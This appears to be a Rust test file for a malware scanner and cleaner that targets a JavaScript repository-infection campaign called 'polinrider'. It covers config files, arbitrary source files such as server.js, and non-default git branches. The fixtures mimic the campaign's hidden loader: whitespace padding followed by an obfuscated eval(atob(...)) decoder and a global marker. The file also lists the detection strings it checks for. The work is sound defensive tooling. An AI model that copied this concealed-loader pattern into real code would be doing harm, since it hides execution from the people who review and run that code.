                "{name} must have a remediable polinrider finding; got {findings:?}"
            );
        }

        // CLEAN: apply every remediation action (duplicates on one file are idempotently skipped).
        let actions: Vec<_> = findings.iter().filter_map(|f| action_for(f, &packs)).collect();
        apply(&repo, &actions, false);

        // VERIFY: legit config kept, all payload/padding/shim gone, and a re-scan is clean.
        for name in WAVE3_NAMES {
            let cleaned = fs::read_to_string(repo.join(name)).unwrap();
            assert!(cleaned.contains("const config = { plugins: [] };"), "{name} legit kept:\n{cleaned}");
            assert!(!cleaned.contains("_$_"), "{name} decoder gone:\n{cleaned}");
            assert!(!cleaned.contains("5-3-168"), "{name} version tag gone:\n{cleaned}");
            assert!(!cleaned.contains("createRequire"), "{name} injected shim gone:\n{cleaned}");
            assert!(
                !wormward_core::capability::padding_injection(&cleaned),
                "{name} padding structure gone:\n{cleaned}"
            );
        }
        let after = scan_repo(&repo, &packs);
        assert!(after.is_empty(), "re-scan after clean must be empty: {after:?}");
    }

    #[test]
    fn non_config_source_payload_detected_and_cleaned() {
        // GitHub-corpus gap: ~14% of infected repos carried the payload only in ARBITRARY source
        // (server.js, routes/*.js, Gruntfile.js, controllers…), never a recognized config. The
        // repo-wide structural pass must detect it (version-independent — note the non-`5-3` tag)
        // and it must clean like any other injection, leaving the legit source intact.
        use std::path::Path;
        use wormward_core::remediate::{action_for, apply};
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("victim");
        fs::create_dir_all(repo.join(".git")).unwrap();
        fs::create_dir_all(repo.join("src")).unwrap();
        let pad = " ".repeat(2000);
        let legit = "const express = require('express');\nconst app = express();\napp.get('/', (r,s)=>s.send('ok'));\n";
        let blob = "global['!']='9-5334';var _$_1e42=(function(a,b){return eval(atob(a))})('x',1234567);";
        fs::write(repo.join("src/server.js"), format!("{legit}module.exports = app;{pad}{blob}")).unwrap();
        let packs = builtin_packs();

        let findings = scan_repo(&repo, &packs);
        let hit = findings.iter().find(|f| f.file.as_deref() == Some(Path::new("src/server.js")));
        assert!(hit.is_some(), "payload in src/server.js must be detected: {findings:?}");
        assert!(hit.unwrap().remediable, "structural finding must be remediable");
        assert_eq!(hit.unwrap().campaign, "polinrider");

        let actions: Vec<_> = findings.iter().filter_map(|f| action_for(f, &packs)).collect();
        apply(&repo, &actions, false);
        let cleaned = fs::read_to_string(repo.join("src/server.js")).unwrap();
        assert!(cleaned.contains("const app = express();"), "legit server code kept:\n{cleaned}");
        assert!(cleaned.contains("module.exports = app;"), "export kept:\n{cleaned}");
        assert!(!cleaned.contains("_$_1e42"), "decoder gone:\n{cleaned}");
        assert!(!cleaned.contains("global['!']"), "marker gone:\n{cleaned}");
        assert!(scan_repo(&repo, &packs).is_empty(), "re-scan after clean must be empty");
    }

    #[test]
    fn deep_scan_detects_wave3_on_non_default_branch() {
        // The re-infection lived on non-default branches too, so --deep must cover every branch tip.
        use std::path::Path;
        use std::process::Command;
        use wormward_core::deep_scan_repo;
        fn git(repo: &Path, args: &[&str]) {
            Command::new("git")
                .arg("-C").arg(repo).args(args)
                .env("GIT_TEMPLATE_DIR", "")
                .env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@e.x")
                .env("GIT_COMMITTER_NAME", "t").env("GIT_COMMITTER_EMAIL", "t@e.x")
                .status()
                .unwrap();
        }
        let tmp = TempDir::new().unwrap();
        let repo = tmp.path().join("proj");
        fs::create_dir_all(&repo).unwrap();
        git(&repo, &["init", "-q", "-b", "main"]);
        fs::write(repo.join("metro.config.js"), "export default {};\n").unwrap();
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-q", "-m", "clean"]);
        git(&repo, &["checkout", "-q", "-b", "release/2.0"]);
        fs::write(repo.join("metro.config.js"), wave3_file()).unwrap();
        git(&repo, &["commit", "-q", "-am", "payload"]);
        git(&repo, &["checkout", "-q", "main"]);

        // Working tree (main) is clean — the re-infection is only on the release branch tip.
        assert!(scan_repo(&repo, &builtin_packs()).is_empty(), "main working tree must be clean");
        let deep = deep_scan_repo(&repo, &builtin_packs());
        assert!(
            deep.iter().any(|f| f.git_ref.as_deref() == Some("release/2.0")
                && f.campaign == "polinrider"),
            "wave-3 payload on a non-default branch tip must be found by --deep: {deep:?}"
        );
    }
}
